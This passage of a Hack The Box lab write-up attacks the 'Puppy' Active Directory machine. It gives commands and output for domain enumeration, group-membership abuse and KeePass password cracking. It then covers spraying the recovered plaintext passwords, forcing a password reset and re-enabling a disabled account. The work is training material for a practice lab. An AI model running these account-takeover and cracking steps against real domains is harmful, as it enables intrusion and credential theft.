+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">[+] IP: 10.10.11.70:445 Name: puppy.htb
+        Disk     Permissions
+        ----     -----------
+        ADMIN$   NO ACCESS
+        C$       NO ACCESS
+        DEV      NO ACCESS
+        IPC$     READ ONLY
+        NETLOGON READ ONLY
+        SYSVOL   READ ONLY
+</code></pre></div>
+<p>Authenticated user levi.james can access IPC$, NETLOGON, SYSVOL shares read-only.</p>
+<p>DEV share exists but not listable.</p>
+<hr/>
+<h3 id="section-ldap-enumeration"><a href="#section-ldap-enumeration" class="heading-link">LDAP Enumeration</a></h3>
+<h4 id="section-basic-domain-information"><a href="#section-basic-domain-information" class="heading-link">Basic Domain Information</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">nmap --script=ldap* -p 389 10.10.11.70 -Pn -T4
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">| ldap-rootdse:
+|   domainFunctionality: 7
+|   forestFunctionality: 7
+|   domainControllerFunctionality: 7
+|   rootDomainNamingContext: DC=PUPPY,DC=HTB
+|   defaultNamingContext: DC=PUPPY,DC=HTB
+|_  dnsHostName: DC.PUPPY.HTB
+</code></pre></div>
+<p>LDAP rootDSE confirms domain structure: DC=PUPPY,DC=HTB.</p>
+<p>Forest and domain functional levels at 7 (Windows Server 2016+).</p>
+<hr/>
+<h4 id="section-full-ldap-search"><a href="#section-full-ldap-search" class="heading-link">Full LDAP Search</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ldapsearch -x -H ldap://puppy.htb -D <span class="hljs-string">&quot;levi.james@PUPPY.HTB&quot;</span> -w <span class="hljs-string">&quot;KingofAkron2025!&quot;</span> -b <span class="hljs-string">&quot;DC=PUPPY,DC=HTB&quot;</span>
+</code></pre></div>
+<p><em>Output trimmed to key findings:</em></p>
+<ul>
+<li>
+<p>Account Lockout Threshold: 0 (no lockout policy)</p>
+</li>
+<li>
+<p>Minimum Password Length: 7 characters</p>
+</li>
+<li>
+<p>Password History: 24 passwords</p>
+</li>
+<li>
+<p>Domain Structure: DC=PUPPY,DC=HTB</p>
+</li>
+<li>
+<p>levi.james has valid credentials.</p>
+</li>
+</ul>
+<hr/>
+<h3 id="section-rpc-client-enumeration"><a href="#section-rpc-client-enumeration" class="heading-link">RPC Client Enumeration</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">rpcclient -U <span class="hljs-string">&#x27;PUPPY.HTB\levi.james&#x27;</span> puppy.htb
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">rpcclient $&gt; querydominfo
+Domain:         PUPPY
+Total Users:    44
+Total Groups:   0
+Server Role:    ROLE_DOMAIN_PDC
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[levi.james] rid:[0x44f]
+user:[ant.edwards] rid:[0x450]
+user:[adam.silver] rid:[0x451]
+user:[jamie.williams] rid:[0x452]
+user:[steph.cooper] rid:[0x453]
+user:[steph.cooper_adm] rid:[0x457]
+</code></pre></div>
+<p>Domain Users discovered: Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">rpcclient $&gt; enumdomgroups
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Enterprise Admins] rid:[0x207]
+group:[DEVELOPERS] rid:[0x459]
+group:[SENIOR DEVS] rid:[0x455]
+group:[HR] rid:[0x454]
+</code></pre></div>
+<p>Groups discovered: Domain Admins, DEVELOPERS, SENIOR DEVS, HR</p>
+<hr/>
+<h2 id="section-3-automated-enumeration"><a href="#section-3-automated-enumeration" class="heading-link">3. Automated Enumeration</a></h2>
+<h3 id="section-enum4linux-summary"><a href="#section-enum4linux-summary" class="heading-link">Enum4Linux Summary</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">enum4linux -u <span class="hljs-string">&#x27;levi.james&#x27;</span> -p <span class="hljs-string">&#x27;KingofAkron2025!&#x27;</span> puppy.htb
+</code></pre></div>
+<ul>
+<li>
+<p>Valid credentials for levi.james</p>
+</li>
+<li>
+<p>Domain SID: <code>S-1-5-21-1487982659-1829050783-2281216199</code></p>
+</li>
+<li>
+<p>Critical vulnerability: No account lockout policy</p>
+</li>
+<li>
+<p>DEV share exists but not listable</p>
+</li>
+<li>
+<p>Administrative account identified: steph.cooper_adm</p>
+</li>
+</ul>
+<hr/>
+<h3 id="section-time-sync-bloodhound-mapping"><a href="#section-time-sync-bloodhound-mapping" class="heading-link">Time Sync &amp; BloodHound Mapping</a></h3>
+<p>Add host to /etc/hosts</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dc.puppy.htb
+</code></pre></div>
+<p>Sync time with DC</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ntpdate puppy.htb
+</code></pre></div>
+<p>Run BloodHound mapping</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">bloodhound-python -u <span class="hljs-string">&#x27;levi.james&#x27;</span> -p <span class="hljs-string">&#x27;KingofAkron2025!&#x27;</span> -d puppy.htb -ns 10.10.11.70 -c All --zip
+</code></pre></div>
+<p>BloodHound confirms 1 domain, 1 computer, 10 users, 56 groups.</p>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: puppy_1"><img src="/assets/puppy/puppy_1.jpg" alt="puppy_1" width="989" height="426" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<hr/>
+<h3 id="section-dev-share-access-keepass"><a href="#section-dev-share-access-keepass" class="heading-link">DEV Share Access &amp; KeePass</a></h3>
+<p>Since we have GenercWrite over develpoers group we can add ourself to DEV group:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">bloodyAD --host <span class="hljs-string">&#x27;10.10.11.70&#x27;</span> -d <span class="hljs-string">&#x27;dc.puppy.htb&#x27;</span> -u <span class="hljs-string">&#x27;levi.james&#x27;</span> -p <span class="hljs-string">&#x27;KingofAkron2025!&#x27;</span> add groupMember DEVELOPERS levi.james  
+</code></pre></div>
+<p>levi.james added to DEVELOPERS.</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">smbclient //10.10.11.70/DEV -U <span class="hljs-string">&#x27;levi.james&#x27;</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">Password <span class="hljs-keyword">for</span> [WORKGROUP\levi.james]:  
+smb: \&gt; <span class="hljs-built_in">ls</span>  
+.  DR 0 2025-09-15 15:01  
+.. D 0 2025-03-08 10:52  
+KeePassXC-2.7.9-Win64.msi A 34394112 &lt;SNIP&gt;
+Projects D 0 &lt;SNIP&gt;
+recovery.kdbx A 2677 &lt;SNIP&gt;
+
+smb: \&gt; get KeePassXC-2.7.9-Win64.msi  
+smb: \&gt; get recovery.kdbx  
+</code></pre></div>
+<p>DEV share contains KeePass installer and recovery.kdbx file.</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">file recovery.kdbx
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">recovery.kdbx: Keepass password database 2.x KDBX
+</code></pre></div>
+<p>KeePass database detected.</p>
+<p>If we try to bruteforce the recovery.kdbx with john it fails:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>keepass2john recovery.kdbx  
+! recovery.kdbx : File version &#x27;40000&#x27; is currently not supported! 
+</code></pre></div>
+<p>We can use this tool to crack the password for the recovery db: <a href="https://github.com/r3nt0n/keepass4brute.git" title="https://github.com/r3nt0n/keepass4brute.git">https://github.com/r3nt0n/keepass4brute.git</a></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">keepass4brute/keepass4brute.sh recovery.kdbx rockyou.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">[*] Password found: liverpool
+</code></pre></div>
+<ul>
+<li>KeePass database password recovered: <code>liverpool</code></li>
+</ul>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: puppy_2"><img src="/assets/puppy/puppy_2.jpg" alt="puppy_2" width="1038" height="632" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<p>Here the extracted credentials:
+<code>ADAM SILVER : HJKL2025!</code><br/>
+<code>ANTONY C. EDWARDS : Antman2025!</code><br/>
+<code>JAMIE WILLIAMSON : JamieLove2025!</code><br/>
+<code>SAMUEL BLAKE : ILY2025!</code><br/>
+<code>STEVE TUCKER : Steve2025!</code></p>
+<hr/>
+<h3 id="section-smb-login-validation"><a href="#section-smb-login-validation" class="heading-link">SMB Login Validation</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">crackmapexec smb 10.10.11.70 -u usernames.txt -p pass.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">SMB 10.10.11.70 445 DC [+] PUPPY.HTB\ant.edwards:Antman2025!
+</code></pre></div>
+<ul>
+<li>ant.edwards credentials validated, able to authenticate to SMB.</li>
+</ul>
+<p>Re-scan the environment from ant-edwards perspective:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">bloodhound-python -u <span class="hljs-string">&#x27;ant.edwards&#x27;</span> -p <span class="hljs-string">&#x27;Antman2025!&#x27;</span> -d puppy.htb -ns 10.10.11.70 -c All --zip
+</code></pre></div>
+<hr/>
+<h2 id="section-4-account-takeover-smbad-exploitation"><a href="#section-4-account-takeover-smbad-exploitation" class="heading-link">4. Account Takeover &amp; SMB/AD Exploitation</a></h2>
+<h3 id="section-outbound-object-control-via-bloodhound"><a href="#section-outbound-object-control-via-bloodhound" class="heading-link">Outbound Object Control via BloodHound</a></h3>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: puppy_3"><img src="/assets/puppy/puppy_3.jpg" alt="puppy_3" width="1047" height="425" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<ul>
+<li>Now we have generic all over Adam.Silver.</li>
+</ul>
+<h3 id="section-ad-account-password-reset-adamsilver"><a href="#section-ad-account-password-reset-adamsilver" class="heading-link">AD Account Password Reset (ADAM.SILVER)</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">bloodyAD --host <span class="hljs-string">&#x27;10.10.11.70&#x27;</span> -d <span class="hljs-string">&#x27;dc.puppy.htb&#x27;</span> -u <span class="hljs-string">&#x27;ant.edwards&#x27;</span> -p <span class="hljs-string">&#x27;Antman2025!&#x27;</span> <span class="hljs-built_in">set</span> password ADAM.SILVER Pwned123!
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">[+] Password changed successfully!
+</code></pre></div>
+<ul>
+<li>Password for AD account ADAM.SILVER successfully changed.</li>
+</ul>
+<h4 id="section-verify-access"><a href="#section-verify-access" class="heading-link">Verify access:</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>crackmapexec smb [10.10.11.70](https://10.10.11.70/ &quot;https://10.10.11.70/&quot;) -u ADAM.SILVER -p &#x27;Pwned123!&#x27; -d PUPPY.HTB 
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>SMB [10.10.11.70](https://10.10.11.70/ &quot;https://10.10.11.70/&quot;)     445 DC [-] PUPPY.HTB\ADAM.SILVER:Pwned123! STATUS_ACCOUNT_DISABLED  
+</code></pre></div>
+<ul>
+<li>We still can&#x27;t access to this account since &quot;STATUS_ACCOUNT_DISABLED&quot;</li>
+<li>Requires LDAP modification.</li>
+</ul>
+<h4 id="section-verify-account-status"><a href="#section-verify-account-status" class="heading-link">Verify account status</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ldapsearch -x -H ldap://10.10.11.70 -D <span class="hljs-string">&quot;ANT.EDWARDS@PUPPY.HTB&quot;</span> -W -b <span class="hljs-string">&quot;DC=puppy,DC=htb&quot;</span> <span class="hljs-string">&quot;(sAMAccountName=ADAM.SILVER)&quot;</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">&lt;SNIP&gt;
+userAccountControl: 66050
+</code></pre></div>
+<ul>
+<li>AD account ADAM.SILVER confirmed as disabled (userAccountControl: 66050).</li>
+</ul>
+<hr/>
+<h3 id="section-enable-adamsilver-via-ldif"><a href="#section-enable-adamsilver-via-ldif" class="heading-link">Enable ADAM.SILVER via LDIF</a></h3>
+<p>Create file: enable_adam.ldif</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>txt</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="txt block, horizontally scrollable"><code class="hljs language-txt">dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+</code></pre></div>
